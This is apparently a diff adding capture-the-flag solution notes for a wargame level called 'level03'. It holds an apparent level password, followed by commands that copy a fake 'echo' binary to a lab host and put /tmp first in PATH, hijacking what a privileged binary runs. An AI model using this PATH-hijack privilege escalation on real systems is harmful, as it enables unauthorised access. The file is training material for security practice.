@@ -1,0 +1,5 @@
+kooda2puivaav1idi4f57q8iq
+cat level03
+scp -P 4242 Ressources/echo level03@192.168.1.99:/tmp
+export PATH=/tmp:${PATH}
+./level03
